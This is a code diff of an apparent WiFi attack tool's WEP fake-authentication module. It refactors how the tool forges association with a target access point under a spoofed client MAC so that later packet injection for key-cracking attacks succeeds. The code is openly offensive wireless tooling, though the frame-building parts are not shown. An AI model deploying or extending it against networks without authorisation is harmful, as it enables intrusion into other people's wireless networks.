@@ -1,20 +1,22 @@
 """WEP fake authentication (`aireplay-ng -1`).
 
-Open-System Authentication + Association as a forged STA so the AP will
-accept frames we inject later (ARP replay, fragmentation, chopchop). On its
-own it generates no IVs — it's the prerequisite that unlocks the rest of the
-WEP suite.
+Open-System Authentication + Association as a forged STA so the AP will accept
+frames we inject later (ARP replay, fragmentation, chopchop). On its own it
+generates no IVs — it's the prerequisite that unlocks the rest of the WEP suite.
 
-Lifecycle mirrors WPA3DowngradeAttack: ``start()`` spins up an async
-keepalive loop + RX filter, ``stop()`` tears them down. The loop
-re-authenticates every ``interval`` seconds (APs silently drop idle
-associations on an inactivity timer; there's no lease in the protocol), and
-*reactively* re-auths the instant we see a Deauth/Disassoc addressed to our
-MAC — so a manual "deauth YOU" (or the real AP kicking us) recovers within
-one RX tick instead of waiting out the countdown.
+LAZY / on-demand: ``start()`` only arms us (registers our MAC + an RX filter so
+we still *hear* deauths); it does NOT authenticate. We stay invisible until a TX
+path actually has something to send and calls ``ensure_associated()`` — so the
+user isn't sitting "associated for no reason", re-announcing every interval. The
+TX paths' own data frames keep the AP's inactivity timer alive while they run;
+an explicit Deauth/Disassoc (or a replay stall) flips us out of ``associated``
+so the *next* ``ensure_associated()`` re-auths within one window. No periodic
+keepalive.
 
-State is exposed for the Focus SECURITY panel: ``state`` (idle / authenticating
-/ associated / failed), ``next_reauth_at`` (drives the countdown) and
+``ensure_associated()`` retries silently (3 attempts, ~1s each) and only logs a
+FAILURE (once per episode) — and a one-line "recovered" if it later comes back.
+Routine success is silent; the live status lives in the Focus SECURITY panel via
+``state`` (idle / authenticating / associated / failed), ``next_reauth_at`` and
 ``fail_reason``.
 """
 
@@ -71,44 +73,50 @@ class FakeAuthStats:
 
 
 class WepFakeAuth:
-    """Open-System fake-auth keepalive daemon against one WEP AP."""
+    """On-demand Open-System fake-auth against one WEP AP."""
+
+    # ensure_associated() makes this many silent attempts (~assoc_timeout each)
+    # before declaring failure — covers the common "first try whiffs, second
+    # succeeds" flakiness without a scary log line.
+    _MAX_ATTEMPTS = 3
+    # After a failed episode, back off this long before the next attempt (so a
+    # persistently-unreachable AP isn't hammered every loop tick).
+    _FAIL_BACKOFF = 5.0
 
     def __init__(
         self,
         iface,
         target: AccessPoint,
         source_mac: Optional[bytes] = None,
-        interval: float = 30.0,
-        fail_retry_interval: float = 3.0,
-        assoc_timeout: float = 2.0,
+        assoc_timeout: float = 1.0,
         log_callback: Optional[Callable[[str], None]] = None,
     ):
         self.iface = iface
         self.target = target
         self.bssid_bytes = _str_to_mac(target.bssid)
         self.source_mac = source_mac or _random_client_mac()
-        self.interval = interval
-        self.fail_retry_interval = fail_retry_interval
         self.assoc_timeout = assoc_timeout
         self._log = log_callback or (lambda _msg: None)
-        # Last time we did something that keeps the AP's inactivity timer at
-        # bay (auth or injected replay traffic). The keepalive skips its
-        # periodic re-auth while this is fresh, so active replay isn't
-        # interrupted every `interval` seconds.
+        # Last time we did something that keeps the AP's inactivity timer at bay
+        # (auth or injected traffic). Informational only now (no keepalive loop).
         self._last_activity = 0.0
 
         self.stats = FakeAuthStats()
-        # State machine surfaced to the UI.
-        self.state: str = "idle"          # idle|authenticating|associated|failed
+        # State machine surfaced to the UI. "ready" = armed but not associated
+        # (the dormant default after start()).
+        self.state: str = "idle"     # idle|ready|authenticating|associated|failed
         self.fail_reason: Optional[str] = None
         self.next_reauth_at: Optional[float] = None
 
         self._active = False
-        self._task: Optional[asyncio.Task] = None
-        # Set by the RX filter; cleared by the loop. Carries "associated" and
-        # "kicked" signals from the sync callback to the async loop.
+        # Serialize concurrent ensure_associated() callers (replay + frag/chop)
+        # so they don't auth-storm each other.
+        self._auth_lock = asyncio.Lock()
+        # Set by the RX filter (sync), read by the auth round.
         self._assoc_ok = False
-        self._reauth_event = asyncio.Event()
+        # Whether we've logged the CURRENT failure episode — so we log a failure
+        # once (not every backoff tick) and a "recovered" line once.
+        self._announced_failure = False
 
     # ---- Frame builders -----------------------------------------------------
 
@@ -148,30 +156,28 @@ class WepFakeAuth:
     # ---- Lifecycle ----------------------------------------------------------
 
     def start(self) -> None:
-        """Register the self MAC + RX filter and spin up the keepalive loop."""
+        """Arm: register the self MAC + RX filter. Does NOT authenticate — that
+        happens lazily on the first ``ensure_associated()`` when a TX path
+        actually has something to send."""
         if self._active:
             return
         self._active = True
         self.stats = FakeAuthStats()
-        self.state = "authenticating"
+        self.state = "ready"
         self.fail_reason = None
+        self.next_reauth_at = None
+        self._announced_failure = False
         self.iface.register_self_mac(self.source_mac, bssid=self.target.bssid)
         self.iface.register_rx_callback(self._rx_cb)
-        self._task = asyncio.create_task(self._keepalive_loop())
-        logger.info(
-            "[WEP-FakeAuth] Started on %s as %s (re-auth every %.0fs)",
-            self.target.bssid, _mac_str(self.source_mac), self.interval,
-        )
+        logger.info("[WEP-FakeAuth] Armed on %s as %s (lazy auth)",
+                    self.target.bssid, _mac_str(self.source_mac))
 
     def stop(self) -> FakeAuthStats:
-        """Tear down the loop + RX filter and drop the YOU client. Idempotent."""
+        """Tear down the RX filter and drop the YOU client. Idempotent."""
         if not self._active:
             return self.stats
         self._active = False
         self.iface.unregister_rx_callback(self._rx_cb)
-        if self._task:
-            self._task.cancel()
-            self._task = None
         self.iface.unregister_self_mac(self.source_mac)
         self.state = "idle"
         self.next_reauth_at = None
@@ -186,55 +192,82 @@ class WepFakeAuth:
         return self._active
 
     def notify_activity(self) -> None:
-        """Called by the replay engine on each injected burst — our own
-        traffic keeps the association alive, so the keepalive can skip its
-        periodic (disruptive) re-auth while replay is running."""
+        """Called by the TX paths on each injected burst — our own traffic keeps
+        the association alive, so there's no need for a periodic re-auth."""
         self._last_activity = time.time()
 
     def request_reauth(self) -> None:
-        """Ask the loop to re-authenticate immediately (e.g. replay detected a
-        stall that looks like a silent de-association)."""
-        self._reauth_event.set()
+        """Drop our 'associated' belief so the next ``ensure_associated()`` re-
+        authenticates (e.g. a replay stall that looks like a silent de-assoc,
+        which the AP never signalled with a Deauth)."""
+        if self.state == "associated":
+            self.stats.reactive_reauths += 1
+            self.state = "ready"
+            self._assoc_ok = False
 
-    # ---- Keepalive loop -----------------------------------------------------
+    # ---- On-demand association ----------------------------------------------
 
-    async def _keepalive_loop(self) -> None:
-        try:
-            await self._authenticate()
-            while self._active:
-                # Fast retry after a failure; otherwise the normal keepalive.
-                timeout = (
-                    self.fail_retry_interval
-                    if self.state == "failed"
-                    else self.interval
-                )
-                self._reauth_event.clear()
-                try:
-                    await asyncio.wait_for(self._reauth_event.wait(), timeout=timeout)
-                    woke_early = True
-                except asyncio.TimeoutError:
-                    woke_early = False
-                if not self._active:
-                    break
+    async def ensure_associated(self) -> bool:
+        """Guarantee we're associated before a TX path transmits. Fast path when
+        already associated; otherwise authenticate (silently retrying), honoring
+        a post-failure backoff. Returns True iff associated."""
+        if not self._active:
+            return False
+        if self.state == "associated":
+            return True
+        if self._in_backoff():
+            return False
+        async with self._auth_lock:
+            # Re-check under the lock — another caller may have just associated
+            # (or just failed and entered backoff).
+            if self.state == "associated":
+                return True
+            if self._in_backoff():
+                return False
+            return await self._try_associate()
 
-                if self.state == "failed":
-                    await self._authenticate()                 # fast retry
-                elif woke_early:
-                    self.stats.reactive_reauths += 1
+    def _in_backoff(self) -> bool:
+        return (
+            self.state == "failed"
+            and self.next_reauth_at is not None
+            and time.time() < self.next_reauth_at
+        )
+
+    async def _try_associate(self) -> bool:
+        """Up to ``_MAX_ATTEMPTS`` silent auth rounds. Logs only a failure (once
+        per episode) or a one-line recovery."""
+        for _attempt in range(self._MAX_ATTEMPTS):
+            if not self._active:
+                return False
+            if await self._auth_round():
+                self.state = "associated"
+                self.fail_reason = None
+                self.next_reauth_at = None
+                self._last_activity = time.time()
+                self.stats.associations += 1
+                if self._announced_failure:
                     self._log(
-                        "[yellow]⟳ Fake-Auth: re-authenticating "
-                        "(kicked / requested)[/yellow]"
+                        "[green]✓ Fake-Auth recovered[/green] "
+                        f"[dim](associated as {_mac_str(self.source_mac)})[/dim]"
                     )
-                    await self._authenticate()
-                elif (time.time() - self._last_activity) > self.interval:
-                    # Idle keepalive tick — only when replay isn't already
-                    # keeping us associated (avoids interrupting active replay).
-                    await self._authenticate()
-        except asyncio.CancelledError:
-            pass
+                    self._announced_failure = False
+                return True
 
-    async def _authenticate(self) -> None:
-        """One Auth → Assoc round; updates state from the AP's response."""
+        # All attempts failed — back off and log once per episode.
+        self.state = "failed"
+        if not self.fail_reason:
+            self.fail_reason = "no Assoc resp"
+        self.next_reauth_at = time.time() + self._FAIL_BACKOFF
+        if not self._announced_failure:
+            self._announced_failure = True
+            self._log(
+                f"[red]✗ Fake-Auth failed:[/red] [white]{self.fail_reason}[/white] "
+                f"[dim](retry in {int(self._FAIL_BACKOFF)}s)[/dim]"
+            )
+        return False
+
+    async def _auth_round(self) -> bool:
+        """One Auth → Assoc exchange; returns True iff the AP accepted us."""
         if self.iface.current_channel != self.target.channel:
             await self.iface.set_channel(self.target.channel)
 
@@ -249,29 +282,7 @@ class WepFakeAuth:
         deadline = time.time() + self.assoc_timeout
         while time.time() < deadline and self._active and not self._assoc_ok:
             await asyncio.sleep(0.05)
-
-        if self._assoc_ok:
-            self.state = "associated"
-            self.fail_reason = None
-            self.next_reauth_at = None
-            self._last_activity = time.time()   # auth counts as keepalive
-            self.stats.associations += 1
-            self._log(
-                f"[green]✓ Fake-Auth: associated[/green] as "
-                f"[bold]{_mac_str(self.source_mac)}[/bold]"
-            )
-        else:
-            self.state = "failed"
-            # Short reason for the SECURITY panel; full hint goes to the log.
-            if not self.fail_reason:
-                self.fail_reason = "no Assoc Resp"
-            # Drive the panel's "retry in Ns" countdown off the fast-retry tick.
-            self.next_reauth_at = time.time() + self.fail_retry_interval
-            self._log(
-                f"[red]✗ Fake-Auth failed:[/red] {self.fail_reason} "
-                f"[dim](out of range / not susceptible? retrying in "
-                f"{int(self.fail_retry_interval)}s)[/dim]"
-            )
+        return self._assoc_ok
 
     # ---- RX filter (sync, on the loop) --------------------------------------
 
@@ -280,7 +291,7 @@ class WepFakeAuth:
 
         Per-subtype length guards: a Deauth/Disassoc is only 26 bytes (24 B
         header + 2 B reason), so a blanket "len >= 28" gate would drop the
-        very kicks the reactive re-auth path exists to catch.
+        very kicks we want to react to.
         """
         if not self._active or len(frame_bytes) < 24:
             return
@@ -304,7 +315,10 @@ class WepFakeAuth:
             if status != 0:
                 self.fail_reason = f"Auth rejected (status {status})"
         elif subtype in (_SUBTYPE_DEAUTH, _SUBTYPE_DISASSOC):
-            # We got kicked — wake the loop to re-auth immediately.
-            self.state = "authenticating"
+            # We got kicked — drop our 'associated' belief so the next
+            # ensure_associated() re-auths. No eager re-auth here.
+            if self.state == "associated":
+                self.stats.reactive_reauths += 1
+            self.state = "ready"
+            self._assoc_ok = False
             self.next_reauth_at = None
-            self._reauth_event.set()
